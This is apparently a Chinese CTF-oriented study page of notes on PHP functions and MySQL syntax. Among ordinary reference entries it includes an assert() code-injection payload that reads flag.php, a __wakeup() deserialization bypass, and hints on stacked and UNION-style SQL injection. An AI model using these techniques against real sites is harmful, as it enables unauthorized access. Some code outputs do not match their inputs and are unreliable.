<h2 id="PHP太怪了"><a href="#PHP太怪了" class="headerlink" title="PHP太怪了"></a>PHP太怪了</h2><h3 id="变量套变量"><a href="#变量套变量" class="headerlink" title="变量套变量"></a>变量套变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>;<span class="comment">//输出 world</span></span><br></pre></td></tr></table></figure>

<h3 id="变量套函数"><a href="#变量套函数" class="headerlink" title="变量套函数"></a>变量套函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showstr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">showstr();</span><br><span class="line"><span class="comment">//正常的调用方法</span></span><br><span class="line"><span class="variable">$action</span> = <span class="string">&quot;showstr&quot;</span>;</span><br><span class="line"><span class="variable">$action</span>();<span class="comment">//实际调用了showstr()函数</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="PHP-func-DICT"><a href="#PHP-func-DICT" class="headerlink" title="PHP func DICT"></a><big><center>PHP <i>func</i> DICT</center></big></h1><p><code>error_reporting(0)</code>    # 关闭错误报告</p>
<p><code>print()</code>/<code>print_r()</code>/<code>echo</code>    # echo更像是如 if，while这样的语言结构，没有返回值，且可以直接打印多个变量；print()与 print_r()是函数，存在返回值 true；其中 print_r()相比 print()可以传入的变量范围更大，数组也可以用 print_r()打印出来</p>
<p><code>var_dump($var)</code>    # 展示$var的value与type</p>
<p><code>eval($str)</code>    # 执行参数中包含的PHP代码</p>
<p><code>assert($str)</code>    # 断言，可以看作异常处理的一种高级形式，用于调试代码，重点在于assert函数会将传入的 str类型参数全部当成 PHP代码执行，与 eval类似。但根据测试，assert的代码不能有空格，也不能输入多个语句</p>
<ul>
<li><p>assert的闭合 // 理论上如此，待测试</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//POST：myString=&#x27;&#x27;) or print_r(file_get_content(flag.php));#</span></span><br><span class="line">assert(<span class="variable">$_POST</span>[<span class="string">&#x27;myString&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;holyShit&quot;</span>);</span><br><span class="line"><span class="comment">//最终会执行的是：</span></span><br><span class="line">assert(<span class="string">&#x27;&#x27;</span>) <span class="keyword">or</span> print_r(file_get_content(flag.php));<span class="comment">#) or die(&quot;holyShit&quot;);</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><code>scandir($str)</code>    # 扫描指定目录下的文件，返回值为文件名组成的数组</p>
<p><code>die(str)</code>与<code>exit(str)</code>    # 退出当前脚本并弹出 status状态描述，其中比较有趣的是or die()这种组合。因 PHP并不区分数据类型，所以$file既可以是int也可以bool，所以这样的语句不会报错，在大多数的语言中，bool or bool这样的语句中，若前一个值为真后一个值就不再判断了。例如下列代码，如果 fopen函数执行正确的话，会返回一个大于0的int值（文件指针资源，这其实就是true），后面的语句就不会执行了，而失败时返回false</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;抱歉，无法打开: <span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="literal">true</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no1&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.1 passed&quot;</span>;</span><br><span class="line"><span class="literal">false</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no2&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.2 passed&quot;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>[Out]<br>
no.1 passed<br>
no2</blockquote>

<p><code>system(shell command)</code>    # 执行shell命令</p>
<p><code>file_get_contents($stream)</code>    # 将数据流读入字符串，若php://input作为参数，就可以将用户输入读成字符串</p>
<p><code>file($stream)</code>    # 将数据流读入数组，每行作一个元素</p>
<p><code>highlight_file($filename,$return)</code>    # 对文件进行语法高亮输出，$return参数可选，默认为false；当为true时返回字符串而不输出</p>
<p><code>extract($array)</code>    # 输入一个数组，将数组中的元素解析到对应的变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>$a = 3; $b = Dog; $c = Horse</blockquote>

<p><code>eregi($str1,$str2)</code>与<code>ereg($str1,$str2)</code>    # 在 str2中搜索 str1中的字符，存在时返回 true，这两个函数完全相同，除了前者忽略大小写，后者不忽略大小写，当第一个字段为空 (NULL)时，就绕过了此函数 // 这两个函数都是 PHP4，PHP5才有，较为远古</p>
<p><code>trim($str1, $str2)</code>    # 当只填一个参数时，trim函数返回去除字符串两侧的空白字符后的结果；当填了第二个参数后，trim函数返回 $str1两端去除 $str2指定的字符后的结果</p>
<p><code>strstr($str1,$str2)</code>与<code>stristr(\$str1,\$str2)</code>    # 查找$str2在$str1中第一次出现的地方，并返回剩余部分，如$str1=”abcde”，$str2=”cd”，则返回 “cde”。前者严格比较大小写，可用更改大小写检查网页是否使用strstr()进行过滤；后者对大小写不敏感</p>
<p><code>substr($str,$int1,$int2)</code>    # 返回$str中第$int1个字符开始，的$int2个字符组成的字符串，当$int2不设置时返回第$int1个字符后的全部字符</p>
<p><code>strcmp($str1, $str2)</code>    # 比较两个字符串，当两个字符串相等，返回 0，前者大于后者返回 1，后者大于前者返回 -1，字符串的大小根据自然排序比较，大概就跟着感觉走的意思 …</p>
<p><code>str_replace($str1,$str2,$str3)</code>    # 把$str3中存在的所有$str1替换为$str2</p>
<p><code>stripos($str1,$str2)</code>    # 查找 str2在 str1中第一次出现的位置，返回 int</p>
<p><code>parse_str($str)</code>    # 把查询字符串解析到变量中，如parse_str(“name=Bill&amp;age=60”); 则现在有了两个变量$name=Bill 和$age=60</p>
<p><code>str_split($str,$len)</code>    # 把字符串分割到数组中，按长度分割，$len默认为1，看个例子就明白了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(str_split(<span class="string">&quot;S hangh ai&quot;</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure>

<blockquote>[Out]<br>Array(<br>
    &emsp;[0] => S h<br>
    &emsp;[1] => ang<br>
    &emsp;[2] => h a<br>
    &emsp;[3] => i<br>
)</blockquote>

<p><code>explode($str1,$str2)</code>    # $str1作为分隔符，以此将字符串打散为数组，看个例子就明白了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World, I love You&quot;</span>;</span><br><span class="line">print_r (explode(<span class="string">&quot; &quot;</span>,<span class="variable">$str</span>));<span class="comment">//空格作为分隔符</span></span><br></pre></td></tr></table></figure>

<blockquote>[Out]<br>Array(<br>&emsp;[0] => Hello<br>&emsp;[1] => world.<br>&emsp;[2] => I<br>&emsp;[3] => love<br>&emsp;[4] => Shanghai!<br>)</blockquote>

<p><code>preg_replace($pattern, $replacement, $subject)</code>    # 其中 {$pattern为正则表达式，$replacement为替换字符串，$subject 为要搜索替换的目标字符串或字符串数组} 。这个函数正则表达式$pattern以“/e”结尾时$replacement的值会被作为PHP函数执行，例如执行preg_replace (‘/test/e’ , “phpinfo();” , “test”)，“test”会被替换为 phpinfo();并执行</p>
<p><code>preg_match($pattern, $str, $matches)</code>    # 其中 $pattern为正则表达式，$str为被搜索的目标字符串，若提供了参数 $matches，则会在匹配到后被返回，且附加在字符串中的 index，示例如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/(foo)(bar)(baz)/&#x27;</span>, <span class="string">&#x27;foobarbaz&#x27;</span>, <span class="variable">$matches</span>, PREG_OFFSET_CAPTURE);</span><br><span class="line">print_r(<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure>

<blockquote>[Out]<br>Array(<br>&emsp;[0] => Array(<br>&emsp;&emsp;[0] => foobarbaz<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[1] => Array(<br>&emsp;&emsp;[0] => foo<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[2] => Array(<br>&emsp;&emsp;[0] => bar<br>&emsp;&emsp;[1] => 3)<br>&emsp;[3] => Array(<br>&emsp;&emsp;[0] => baz<br>&emsp;&emsp;[1] => 6<br>&emsp;)<br>)</blockquote>

<p><code>serialize()</code>与<code>unserialize()</code>    # 序列化与反序列化，互为反函数，只需了解序列化即可，简单来说就是把变量转为 string，保留关于原本数据类型的信息，序列化的存在意义在于使一切变量的传输无异于字符串传输；但需要注意的是private变量名前会有%00包裹类名占位</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kyriota</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">25</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weight</span>=<span class="number">60.5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$LoveCTF</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thingsDoentLike</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tags</span>=<span class="keyword">array</span>(<span class="string">&quot;Steam&quot;</span>,<span class="number">1990</span>,<span class="string">&quot;Aperture&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Kyriota()),<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>[Out]//原本无换行符与任何空格，为了可读性而手动添加<br>O:7:"Kyriota":6:{<br>&emsp;s:3:"sex";s:4:"male";<br>&emsp;s:3:"age";i:25;<br>&emsp;s:6:"weight";d:60.5;<br>&emsp;s:7:"LoveCTF";b:1;<br>&emsp;s:15:"thingsDoentLike";N;<br>&emsp;s:13:"%00Kyriota%00tags";a:3:{<br>&emsp;&emsp;i:0;s:5:"Steam";<br>&emsp;&emsp;i:1;i:1990;<br>&emsp;&emsp;i:2;s:8:"Aperture";<br>&emsp;}<br>}</blockquote>

<ul>
<li><p><code>__wakeup()</code>与<code>__sleep()</code>    # 在 serialize()的时候先执行__sleep()，对数据预处理；在 unserialize()执行的时候先执行__wakeup()，对数据再处理。函数命名非常形象，序列化后变量与对象不再被解析，称其为sleep与wakeup非常合适</p>
</li>
<li><p>__wakeup()绕过：当序列化字符串表示的对象属性个数大于真是个数时就会跳过 __wakeup()执行，例如下面是一正常序列化后的文本，而当3被篡改为任何大于3的数后，反序列化时将不执行__wakeup()：</p>
<center><code>O:7:”Student”:3:&#123;s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:&#123;&#125;&#125;</code></center></li>
<li><p><code>__construct()</code>与<code>__destruct()</code>    # 在创建对象时construct，在对象销毁时destruct</p>
</li>
</ul>
<p>一个程序即可解释序列化以及上述相关函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destrcut~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__sleep~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=serialize(<span class="keyword">new</span> User(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;psswd&#x27;</span>));</span><br><span class="line"><span class="variable">$s_edited</span>=<span class="string">&#x27;O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;psswd&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">unserialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;↑↑↑unserialized with wakeup and destruct&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$s_edited</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;↑↑↑unserialized, only destruct whithout wakeup above this one&#x27;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>[Out]<br>
__construct~<br>
__sleep~<br>
__destrcut~<br>
O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"psswd";}<br>
__wakeup~<br>
__destrcut~<br>
↑↑↑unserialized with wakeup and destruct<br>
__destrcut~<br>
bool(false)<br>
↑↑↑unserialized, only destruct whithout wakeup above this one<br><br>
PHP Notice:  unserialize(): Unexpected end of serialized data on line 27<br>
PHP Notice:  unserialize(): Error at offset 68 of 69 bytes on line 27</blockquote>
<code>mysql</code>与<code>mysqli</code>    # mysql连接：每当第二次使用的时候，都会重新打开一个新的进程；mysqli连接：一直都只使用同一个进程

<p><code>mysql_query($query)</code>    # 查询单条语句，不需要查询语句以分号结束</p>
<p><code>multi_query($query)</code>    # 查询多条语句，语句间以分号分隔，结尾不需要分号，当添加分号发现是以<code>multi_query()</code>查询的时候，可以进行堆叠注入，追加任何mysql查询语句</p>
<p><code>mysql_fetch_xxx</code>    # 这种类型的函数都是从结果集中取出一行</p>
<table>
<thead>
<tr>
<th>func</th>
<th>return</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_mysql_fetch_array.asp">mysql_fetch_array()</a></td>
<td>从结果集中取得一行作为关联数组，或数字数组，或二者兼有</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_mysql_fetch_assoc.asp">mysql_fetch_assoc()</a></td>
<td>从结果集中取得一行作为关联数组</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_mysql_fetch_field.asp">mysql_fetch_field()</a></td>
<td>从结果集中取得列信息并作为对象返回</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_mysql_fetch_lengths.asp">mysql_fetch_lengths()</a></td>
<td>取得结果集中每个字段的内容的长度</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_mysql_fetch_object.asp">mysql_fetch_object()</a></td>
<td>从结果集中取得一行作为对象</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_mysql_fetch_row.asp">mysql_fetch_row()</a></td>
<td>从结果集中取得一行作为数字数组</td>
</tr>
</tbody></table>
<hr>
<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><big><center>SQL</center></big></h1><h2 id="MySQL基础命令"><a href="#MySQL基础命令" class="headerlink" title="MySQL基础命令"></a><big>MySQL基础命令</big></h2><ul>
<li><p>通过命令行输入 mysql -u root -p，然后输入密码即可登录</p>
<ul>
<li>若报错，可能是 mysql 服务未启动，也可能是需要管理员权限的 cmd</li>
</ul>
</li>
<li><p>SHOW DATABASES; #查看当前数据库</p>
</li>
<li><p>SHOW TABLES; #查看当前数据库中的所有数据表名称</p>
</li>
<li><p>DESCRIBE table; #查看数据表结构，如参数名及数据类型</p>
<ul>
<li>SHOW COLUMNS FROM table1,table2…; #和上面的DESCRIBE一样，只是这可以同时选择多个表</li>
</ul>
</li>
<li><p>USE database; #进入某一数据库下进行操作</p>
</li>
<li><p>CREATE DATABASE database; #新建数据库</p>
</li>
<li><p>CREATE TABLE table(row1 type1,row2 type2…); #在进入某一数据库的前提下新建数据表</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Person (Name varchar(25),Address varchar(80),Age int(11)) </span><br></pre></td></tr></table></figure></li>
<li><p>INSERT INTO table VALUES(value1, value2, …); #向数据表加入数据</p>
</li>
<li><p>DELETE FROM table WHERE condition; #删除符合condition的数据</p>
</li>
<li><p>ALTER TABLE table DROP column; #删除列</p>
</li>
<li><p>UPDATE table SET col.1=value.1 WHERE col.2=value.2; #修改数据，col.1=value.1为赋值语句，col.2=value.2为查找项</p>
</li>
<li><p>SELECT：用于查询数据，虽直译为‘选择’，但我认为其与var_dump类似</p>
<ul>
<li><p><a href="dev.mysql.com/doc/refman/8.0/en/handler.html">HANDLER</a>：MySQL的专用查询语句，提供通往表的直接通道的存储引擎接口</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLER users OPEN;</span><br><span class="line">HANDLER user READ NEXT;</span><br><span class="line">HANDLER user CLOSE;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>show warnings; #显示错误信息.</p>
</li>
<li><p>注释符：“#”与  “– ”(两个减号后面带一个空格)，注意GET方法传参需要先url编码；以及区域注释符/*注释内容*/</p>
</li>
</ul>
<p>注意：当数字型字符或MySQL关键字作为字段、表、库名查询时，应该用反单引号括起来，如 SELECT * FROM &#96;2333&#96; WHERE &#96;from&#96;=&#96;8080&#96;;其中的2333作为表名，from作为字段名，8080作为字段内容 </p>
<h2 id="MySQL-DICT"><a href="#MySQL-DICT" class="headerlink" title="MySQL DICT"></a><big>MySQL DICT</big></h2><ul>
<li><p><code>UNION</code>：用于合并两个或多个 SELECT语句的结果集</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select uname,passwd from users</span><br><span class="line">union</span><br><span class="line">select &#39;Union&#39;,233;</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| uname    | passwd      |</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| Kyriota  | kyriotayyds |</span><br><span class="line">        #| 0test    | 0test       |</span><br><span class="line">        #| 233test  | 233test     |</span><br><span class="line">        #| admin    | adpasswd    |</span><br><span class="line">        #| Dr.Who   | Doctor      |</span><br><span class="line">        #| Union    | 233         |</span><br><span class="line">        #+----------+-------------+</span><br></pre></td></tr></table></figure></li>
<li><p><code>ORDER BY col</code>：以某一列来升序排列，需要降序排列时加上DESC即可，通常通过附加此函数验证数据表有多少列，因为用int表示根据第几个column排序时，超过实际存在的列数会报错</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 2;#此处的2即为passwd列</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">mysql&gt; select * from users order by 3;</span><br><span class="line">        #ERROR 1054 (42S22): Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br></pre></td></tr></table></figure></li>
<li><p><code>CONCAT(col1,col2,col3...)</code>：将多个字符串连接成一个字符串</p>
</li>
<li><p><code>CONCAT_WS(sep_str,col1,col,col3...)</code>：可以指定分隔符的连接字符串函数</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;-&#39;,uname,passwd) from users;</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| concat_ws(&#39;-&#39;,uname,passwd) |</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| Kyriota-kyriotayyds         |</span><br><span class="line">        #| 0test-0test                 |</span><br><span class="line">        #| 233test-233test             |</span><br><span class="line">        #| admin-adpasswd              |</span><br><span class="line">        #| Dr.Who-Doctor               |</span><br><span class="line">        #+-----------------------------+</span><br></pre></td></tr></table></figure></li>
<li><p><code>GROUP_CONCAT(col SEPARATOR 'sep') FROM table GROUP BY col</code>：指定分隔符与分类方式，当不填写分类方式则全部分为一类，这可以方便爆表</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Dr.What | Doctor      |</span><br><span class="line">        #| Dr.How  | Doctor      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">select group_concat(uname separator &#39; , &#39;) from users group by passwd;</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39; , &#39;) |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| 0test                               |</span><br><span class="line">        #| 233test                             |</span><br><span class="line">        #| admin                               |</span><br><span class="line">        #| Dr.Who , Dr.What , Dr.How           |</span><br><span class="line">        #| Kyriota                             |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">select group_concat(uname separator &#39;-&#39;) from users;</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39;-&#39;)                 |</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| Kyriota-0test-233test-admin-Dr.Who-Dr.What-Dr.How |</span><br><span class="line">        #+---------------------------------------------------+</span><br></pre></td></tr></table></figure></li>
<li><p><code>SELECT DISTINCT</code>：去除重复的数据再返回</p>
</li>
<li><p><code>WHERE</code>：</p>
<ul>
<li><code><></code>：不等于，如 id&lt;&gt;4</li>
<li><code>BETWEEN ... AND ...</code>：在某范围内， 如 id BETWEEN 4 AND 8</li>
<li><code>LIKE</code>：模糊匹配，如 LIKE ‘A%’ 则表示筛选出 A开头的，%可以代替一个或多个字符</li>
<li><code>IN ( )</code>：只匹配与括号中对应的内容，如 WHERE name IN (‘admin’, ‘guest’)</li>
<li>NULL：找NULL时不能WHERE col=NULL，应该是WHERE col IS NULL</li>
</ul>
</li>
<li><p><code>AND / OR / NOT</code>：</p>
<ul>
<li><code>AND</code>：<code>WHERE Country='China' AND City='BeiJing'</code></li>
<li><code>OR</code>：<code>WHERE City='ShangHai' OR City='BeiJing'</code></li>
<li><code>NOT</code>：<code>WHERE NOT Country='China'</code></li>
</ul>
</li>
<li><p><code>CASE WHEN condition THEN statement ... END</code>：和大多数的case语句一样，但注意它相对于IF() ※ 不需要逗号与括号 ※</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,case when mark &gt;&#x3D;90 then &#39;A&#39; when mark &gt;&#x3D;60 then &#39;B&#39; else &#39;C&#39; end as level from grades order by mark desc;</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Name | mark | level |</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Tom  |   95 | A     |</span><br><span class="line">        #| Jill |   92 | A     |</span><br><span class="line">        #| Alan |   76 | B     |</span><br><span class="line">        #| Neo  |   59 | C     |</span><br><span class="line">        #+------+------+-------+</span><br></pre></td></tr></table></figure></li>
<li><p><code>IF(exp1,exp2,exp3)</code>：若exp1，则exp2，否则exp3</p>
